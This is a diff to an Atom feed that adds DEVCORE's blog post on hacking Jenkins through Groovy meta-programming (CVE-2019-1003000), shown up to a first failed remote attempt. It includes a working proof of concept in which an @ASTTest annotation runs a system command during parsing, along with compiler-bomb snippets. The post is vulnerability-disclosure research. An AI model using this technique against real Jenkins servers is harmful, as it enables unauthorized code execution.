@@ -4,13 +4,643 @@
  <title>DEVCORE 戴夫寇爾</title>
  <link href="https://devco.re/" rel="self"/>
  <link href="https://devco.re"/>
- <updated>2019-01-28T01:50:06+08:00</updated>
+ <updated>2019-02-19T19:29:42+08:00</updated>
  <id>https://devco.re</id>
  <author>
    <name>DEVCORE</name>
    <email>contact [at] devco.re</email>
  </author>
 
+ 
+ <entry>
+   <title>Hacking Jenkins Part 2 - Abusing Meta Programming for Unauthenticated RCE!(EN)</title>
+   <link href="https://devco.re/blog/2019/02/19/hacking-Jenkins-part2-abusing-meta-programming-for-unauthenticated-RCE-en/"/>
+   <updated>2019-02-19T00:00:00+08:00</updated>
+   <id>https://devco.re/blog/2019/02/19/hacking-Jenkins-part2-abusing-meta-programming-for-unauthenticated-RCE-en</id>
+   <content type="html">&lt;p&gt;&lt;a href=&quot;/blog/2019/02/19/hacking-Jenkins-part2-abusing-meta-programming-for-unauthenticated-RCE-en/&quot;&gt;English Version&lt;/a&gt;&lt;br /&gt;
+&lt;a href=&quot;/blog/2019/02/19/hacking-Jenkins-part2-abusing-meta-programming-for-unauthenticated-RCE/&quot;&gt;中文版本&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;Hello everyone!&lt;/p&gt;
+
+&lt;p&gt;This is the Hacking Jenkins series part two! For those people who still have not read the part one yet, you can check the following link to get some basis and see how vulnerable Jenkins’ dynamic routing is!&lt;/p&gt;
+&lt;ul&gt;
+  &lt;li&gt;&lt;a href=&quot;https://devco.re/blog/2019/01/16/hacking-Jenkins-part1-play-with-dynamic-routing/&quot;&gt;Hacking Jenkins Part 1 - Play with Dynamic Routing&lt;br /&gt;
+&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;As the previous article said, in order to utilize the vulnerability, we want to find a code execution can be chained with the ACL bypass vulnerability to a well-deserved pre-auth remote code execution! But, I failed. Due to the feature of dynamic routing, Jenkins checks the permission again before most dangerous invocations(Such as the &lt;a href=&quot;http://jenkins.local/script&quot;&gt;Script Console&lt;/a&gt;)! Although we could bypass the first ACL, we still can’t do much things :(&lt;/p&gt;
+
+&lt;p&gt;After Jenkins released the &lt;a href=&quot;https://jenkins.io/security/advisory/2018-12-05/#SECURITY-595&quot;&gt;Security Advisory&lt;/a&gt; and fixed the dynamic routing vulnerability on 2018-12-05, I started to organize my notes in order to write this Hacking Jenkins series. While reviewing notes, I found another exploitation way on a gadget that I failed to exploit before! Therefore, the part two is the story for that! This is also one of my favorite exploits and is really worth reading :)&lt;/p&gt;
+
+&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
+
+&lt;h2 id=&quot;vulnerability-analysis&quot;&gt;Vulnerability Analysis&lt;/h2&gt;
+&lt;hr /&gt;
+
+&lt;p&gt;First, we start from the Jenkins Pipeline to explain &lt;a href=&quot;https://jenkins.io/security/advisory/2019-01-08/#SECURITY-1266&quot;&gt;CVE-2019-1003000&lt;/a&gt;! Generally the reason why people choose Jenkins is that Jenkins provides a powerful Pipeline feature, which makes writing scripts for software building, testing and delivering easier! You can imagine Pipeline is just a powerful language to manipulate the Jenkins(In fact, Pipeline is a DSL built with Groovy)&lt;/p&gt;
+
+&lt;p&gt;In order to check whether the syntax of user-supplied scripts is correct or not, Jenkins provides an interface for developers! Just think about if you are the developer, how will you implement this syntax-error-checking function? You can just write an AST(Abstract Syntax Tree) parser by yourself, but it’s too tough. So the easiest way is to reuse existing function and library!&lt;/p&gt;
+
+&lt;p&gt;As we mentioned before, Pipeline is just a DSL built with Groovy, so Pipeline must follow the Groovy syntax! If the Groovy parser can deal with the Pipeline script without errors, the syntax must be correct! The code fragments here shows how Jenkins validates the Pipeline:&lt;/p&gt;
+
+&lt;div class=&quot;language-java highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kd&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;JSON&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;doCheckScriptCompile&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nd&quot;&gt;@QueryParameter&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;String&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;value&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
+    &lt;span class=&quot;k&quot;&gt;try&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
+        &lt;span class=&quot;n&quot;&gt;CpsGroovyShell&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;trusted&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;CpsGroovyShellFactory&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kc&quot;&gt;null&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;).&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;forTrusted&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;().&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;build&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;();&lt;/span&gt;
+        &lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;CpsGroovyShellFactory&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kc&quot;&gt;null&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;).&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;withParent&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;trusted&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;).&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;build&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;().&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;getClassLoader&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;().&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;parseClass&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;value&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;
+    &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;catch&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;CompilationFailedException&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;x&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
+        &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;JSONArray&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;fromObject&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;CpsFlowDefinitionValidator&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;toCheckStatus&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;x&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;).&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;toArray&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;());&lt;/span&gt;
+    &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
+    &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;CpsFlowDefinitionValidator&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;CheckStatus&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;SUCCESS&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;asJSON&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;();&lt;/span&gt;
+    &lt;span class=&quot;c1&quot;&gt;// Approval requirements are managed by regular stapler form validation (via doCheckScript)&lt;/span&gt;
+&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Here Jenkins validates the Pipeline with the method &lt;a href=&quot;http://docs.groovy-lang.org/latest/html/api/groovy/lang/GroovyClassLoader.html#parseClass-java.lang.String-&quot;&gt;GroovyClassLoader.parseClass(…)&lt;/a&gt;! It should be noted that this is just an AST parsing. Without running &lt;code class=&quot;highlighter-rouge&quot;&gt;execute()&lt;/code&gt; method, any dangerous invocation won’t be executed! If you try to parse the following Groovy script, you get nothing :(&lt;/p&gt;
+
+&lt;div class=&quot;language-groovy highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;this&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;class&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;classLoader&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;parseClass&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&#39;&#39;&#39;
+print java.lang.Runtime.getRuntime().exec(&quot;id&quot;)
+&#39;&#39;&#39;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;From the view of developers, the Pipeline can control Jenkins, so it must be dangerous and requires a strict permission check before every Pipeline invocation! However, this is just a simple syntax validation so the permission check here is more less than usual! Without any &lt;code class=&quot;highlighter-rouge&quot;&gt;execute()&lt;/code&gt; method, it’s just an AST parser and must be safe! This is what I thought when the first time I saw this validation. However, while I was writing the technique blog, Meta-Programming flashed into my mind!&lt;/p&gt;
+
+&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
+
+&lt;h2 id=&quot;what-is-meta-programming&quot;&gt;What is Meta-Programming&lt;/h2&gt;
+&lt;hr /&gt;
+
+&lt;p&gt;Meta-Programming is a kind of programming concept! The idea of Meta-Programming is providing an abstract layer for programmers to consider the program in a different way, and makes the program more flexible and efficient! There is no clear definition of Meta-Programming. In general, both processing the program by itself and writing programs that operate on other programs(compiler, interpreter or preprocessor…) are Meta-Programming! The philosophy here is very profound and could even be a big subject on Programming Language!&lt;/p&gt;
+
+&lt;p&gt;If it is still hard to understand, you can just regard &lt;code class=&quot;highlighter-rouge&quot;&gt;eval(...)&lt;/code&gt; as another Meta-Programming, which lets you operate the program on the fly. Although it’s a little bit inaccurate, it’s still a good metaphor for understanding! In software engineering, there are also lots of techniques related to Meta-Programming. For example:&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;C Macro&lt;/li&gt;
+  &lt;li&gt;C++ Template&lt;/li&gt;
+  &lt;li&gt;Java Annotation&lt;/li&gt;
+  &lt;li&gt;Ruby (Ruby is a Meta-Programming friendly language, even there are books for that)&lt;/li&gt;
+  &lt;li&gt;DSL(Domain Specific Languages, such as &lt;a href=&quot;http://sinatrarb.com/&quot;&gt;Sinatra&lt;/a&gt; and &lt;a href=&quot;https://gradle.org/&quot;&gt;Gradle&lt;/a&gt;)&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;When we are talking about Meta-Programming, we classify it into &lt;strong&gt;(1)compile-time&lt;/strong&gt; and &lt;strong&gt;(2)run-time Meta-Programming&lt;/strong&gt; according to the scope. Today, we focus on the compile-time Meta-Programming!&lt;/p&gt;
+
+&lt;p&gt;&lt;em&gt;P.S. It’s hard to explain Meta-Programming in non-native language. If you are interested, here are some materials! &lt;a href=&quot;https://en.wikipedia.org/wiki/Metaprogramming&quot;&gt;Wiki&lt;/a&gt;, &lt;a href=&quot;https://stackoverflow.com/questions/2565572/metaprogramming-self-explanatory-code-tutorials-articles-books/2566561#2566561&quot;&gt;Ref1&lt;/a&gt;, &lt;a href=&quot;http://cs.lmu.edu/~ray/notes/metaprogramming/&quot;&gt;Ref2&lt;/a&gt;&lt;/em&gt;&lt;br /&gt;
+&lt;em&gt;P.S. I am not a programming language master, if there is anything incorrect or inaccurate, please forgive me &amp;lt;(_ _)&amp;gt;&lt;/em&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
+
+&lt;h2 id=&quot;how-to-exploit&quot;&gt;How to Exploit?&lt;/h2&gt;
+&lt;hr /&gt;
+
+&lt;p&gt;From the previous section we know Jenkins validates Pipeline by &lt;a href=&quot;http://docs.groovy-lang.org/latest/html/api/groovy/lang/GroovyClassLoader.html#parseClass-java.lang.String-&quot;&gt;parseClass(…)&lt;/a&gt; and learn that Meta-Programming can poke the parser during compile-time! Compiling(or parsing) is a hard work with lots of tough things and hidden features. So, the idea is, is there any side effect we can leverage?&lt;/p&gt;
+
+&lt;p&gt;There are many simple cases which have proved Meta-Programming can make the program vulnerable, such as the macro expansion in C language:&lt;/p&gt;
+
+&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;cp&quot;&gt;#define a 1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1
+#define b a,a,a,a,a,a,a,a,a,a,a,a,a,a,a,a
+#define c b,b,b,b,b,b,b,b,b,b,b,b,b,b,b,b
+#define d c,c,c,c,c,c,c,c,c,c,c,c,c,c,c,c
+#define e d,d,d,d,d,d,d,d,d,d,d,d,d,d,d,d
+#define f e,e,e,e,e,e,e,e,e,e,e,e,e,e,e,e
+&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;__int128&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;x&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[]&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;f&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;f&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;f&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;f&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;f&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;f&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;f&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;f&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;};&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;or the compiler resource bomb(make a 16GB ELF by just 18 bytes):&lt;/p&gt;
+&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1u&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;};&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;or calculating the Fibonacci number by compiler&lt;/p&gt;
+
+&lt;div class=&quot;language-c++ highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;template&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;n&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;
+&lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;fib&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+    &lt;span class=&quot;k&quot;&gt;static&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;value&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;fib&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;n&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;::&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;value&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;fib&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;n&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;::&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;value&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+&lt;span class=&quot;p&quot;&gt;};&lt;/span&gt;
+&lt;span class=&quot;k&quot;&gt;template&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;lt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;fib&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;static&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;value&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;};&lt;/span&gt;
+&lt;span class=&quot;k&quot;&gt;template&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;lt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;fib&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;static&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;value&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;};&lt;/span&gt;
+
+&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+    &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;a&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;fib&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;10&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;::&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;value&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// 55&lt;/span&gt;
+    &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;b&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;fib&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;20&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;::&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;value&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// 6765&lt;/span&gt;
+    &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;c&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;fib&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;40&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;::&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;value&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// 102334155&lt;/span&gt;
+&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;From the assembly language of compiled binary, we can make sure the result is calculated at compile-time, not run-time!&lt;/p&gt;
+
+&lt;div class=&quot;language-shell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;g++ template.cpp &lt;span class=&quot;nt&quot;&gt;-o&lt;/span&gt; template
+&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;objdump &lt;span class=&quot;nt&quot;&gt;-M&lt;/span&gt; intel &lt;span class=&quot;nt&quot;&gt;-d&lt;/span&gt; template
+...
+00000000000005fa &amp;lt;main&amp;gt;:
+ 5fa:   55                      push   rbp
+ 5fb:   48 89 e5                mov    rbp,rsp
+ 5fe:   c7 45 f4 37 00 00 00    mov    DWORD PTR &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;rbp-0xc],0x37
+ 605:   c7 45 f8 6d 1a 00 00    mov    DWORD PTR &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;rbp-0x8],0x1a6d
+ 60c:   c7 45 &lt;span class=&quot;nb&quot;&gt;fc &lt;/span&gt;cb 7e 19 06    mov    DWORD PTR &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;rbp-0x4],0x6197ecb
+ 613:   b8 00 00 00 00          mov    eax,0x0
+ 618:   5d                      pop    rbp
+ 619:   c3                      ret
+ 61a:   66 0f 1f 44 00 00       nop    WORD PTR &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;rax+rax&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;1+0x0]
+...
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;For more examples, you can refer to the article &lt;a href=&quot;https://codegolf.stackexchange.com/questions/69189/build-a-compiler-bomb&quot;&gt;Build a Compiler Bomb&lt;/a&gt; on StackOverflow!&lt;/p&gt;
+
+&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
+
+&lt;h3 id=&quot;first-attempt&quot;&gt;First Attempt&lt;/h3&gt;
+&lt;hr /&gt;
+
+&lt;p&gt;Back to our exploitation, Pipeline is just a DSL built with Groovy, and Groovy is also a Meta-Programming friendly language. We start reading the Groovy official &lt;a href=&quot;http://groovy-lang.org/metaprogramming.html&quot;&gt;Meta-Programming manual&lt;/a&gt; to find some exploitation ways. In the section 2.1.9, we found the &lt;code class=&quot;highlighter-rouge&quot;&gt;@groovy.transform.ASTTest&lt;/code&gt; annotation. Here is its description:&lt;/p&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;@ASTTest&lt;/code&gt; is a special AST transformation meant to help debugging other AST transformations or the Groovy compiler itself. It will let the developer “explore” the AST during compilation and &lt;strong&gt;perform assertions on the AST&lt;/strong&gt; rather than on the result of compilation. This means that this AST transformations gives access to the AST before the Bytecode is produced. &lt;code class=&quot;highlighter-rouge&quot;&gt;@ASTTest&lt;/code&gt; can be placed on any annotable node and requires two parameters:&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;What! &lt;strong&gt;perform assertions on the AST&lt;/strong&gt;? Isn’t that what we want? Let’s write a simple Proof-of-Concept in local environment first:&lt;/p&gt;
+
+&lt;div class=&quot;language-groovy highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;this&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;class&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;classLoader&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;parseClass&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&#39;&#39;&#39;
+@groovy.transform.ASTTest(value={
+    assert java.lang.Runtime.getRuntime().exec(&quot;touch pwned&quot;)
+})
+def x
+&#39;&#39;&#39;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;div class=&quot;language-shell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;ls
+&lt;/span&gt;poc.groovy
+
+&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;groovy poc.groovy
+&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;ls
+&lt;/span&gt;poc.groovy  pwned
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Cool, it works! However, while reproducing this on the remote Jenkins, it shows:&lt;/p&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;unable to resolve class org.jenkinsci.plugins.workflow.libs.Library&lt;/p&gt;
+
+&lt;/blockquote&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20190219/1.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;What the hell!!! What’s wrong with that?&lt;/p&gt;
+
+&lt;p&gt;With a little bit digging, we found the root cause. This is caused by the &lt;a href=&quot;https://wiki.jenkins.io/display/JENKINS/Pipeline+Shared+Groovy+Libraries+Plugin&quot;&gt;Pipeline Shared Groovy Libraries Plugin&lt;/a&gt;! In order to reuse functions in Pipeline, Jenkins provides the feature that can import customized library into Pipeline! Jenkins will load this library before every executed Pipeline. As a result, the problem become lack of corresponding library in classPath during compile-time. That’s why the error &lt;code class=&quot;highlighter-rouge&quot;&gt;unsable to resolve class&lt;/code&gt; occurs!&lt;/p&gt;
+
